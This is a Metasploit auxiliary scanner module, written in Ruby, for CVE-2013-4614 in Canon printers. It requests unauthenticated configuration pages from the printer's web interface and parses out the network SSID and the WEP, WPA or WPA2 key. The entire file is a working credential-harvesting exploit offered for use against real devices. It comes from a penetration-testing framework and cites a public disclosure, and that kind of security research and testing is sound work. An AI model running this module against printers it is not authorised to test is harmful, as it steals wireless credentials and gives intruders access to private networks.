##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'nokogiri'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Canon Printer Wireless Configuration Disclosure',
			'Description'    => %q{
					This module enumerates wireless credentials from Canon printers with a web interface.
					It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870,
					MX890, MX920.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Matt "hostess" Andreko <mandreko[at]accuvant.com>'
				],
			'References'     => [
				[ 'CVE', '2013-4614' ],
				[ 'OSVDB', '94417' ],
				[ 'URL', 'http://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
			],
			'DisclosureDate' => 'Jun 18 2013'))
	end

	def get_network_settings
		begin
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => '/English/pages_MacUS/lan_set_content.html',
			})
		rescue
			print_error("#{rhost}:#{rport} Could not connect.")
			return
		end

		if res
			if res.code == 200

				html = Nokogiri::HTML(res.body)

				checked_lan_setting = html.xpath '//input[@name="LAN_OPT1" and @checked]'

				if checked_lan_setting.count == 1
					lan_setting = ''
					ssid = ''
					case checked_lan_setting[0]['value']
					when '0'
						lan_setting = 'Do not use LAN'
					when '1'
						lan_setting = 'Use wired LAN'
					when '2'
						lan_setting = 'Use wireless LAN'

						ssid_input = html.xpath '//input[@name="LAN_TXT1"]'
						ssid = ssid_input[0]['value'] if ssid_input.count == 1
					end

					return lan_setting, ssid
				else
					print_error("#{rhost}:#{rport} Could not determine LAN Settings.")
				end

			elsif res.code == 401
				print_error("#{rhost}:#{rport} Authentication failed")
			elsif res.code == 404
				print_error("#{rhost}:#{rport} File not found")
			end
		end
	end

	def get_wireless_key
		begin
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => "/English/pages_MacUS/wls_set_content.html",
			})
		rescue
			print_error("#{ip}:#{rport} Could not connect.")
			return
		end

		if res
			if res.code == 200
				html = Nokogiri::HTML(res.body)
				encryption_setting = ''
				encryption_key = ''

				checked_encryption_setting = html.xpath '//input[@name="WLS_OPT1" and @checked]'
				case checked_encryption_setting[0]['value']
				when '0'
					encryption_setting = 'None'
				when '1'
					encryption_setting = 'WEP'
					wep_key_inputs = html.xpath '//input[starts-with(@name, "WLS_TXT1") and not(@value="")]'
					encryption_key = wep_key_inputs.collect{|x| x['value']}.join(', ')
				when '2'
					encryption_setting = 'WPA'
					wpa_key_input = html.xpath '//input[@name="WLS_TXT2"]'
					encryption_key = wpa_key_input[0]['value']
				when '3'
					encryption_setting = 'WPA2'
					wpa2_key_input = html.xpath '//input[@name="WLS_TXT3"]'
					encryption_key = wpa2_key_input[0]['value']
				end

				return encryption_setting, encryption_key

			elsif res.code == 401
				print_error("#{rhost}:#{rport} Authentication failed")
			elsif res.code == 404
				print_error("#{rhost}:#{rport} File not found")
			end
		end
	end

	def run_host(ip)

		ns = get_network_settings
		return if ns.nil?

		good_string = "#{rhost}:#{rport} Option: #{ns[0]}"
		if ns[0] == 'Use wireless LAN'
			wireless_key = get_wireless_key
			good_string += "\tSSID: #{ns[1]}\tEncryption Type: #{wireless_key[0]}\tKey: #{wireless_key[1]}"
		end

		report_note({
			:data => good_string,
			:type => 'canon.wireless',
			:host => ip,
			:port => rport
		})

		print_good good_string

	end
end
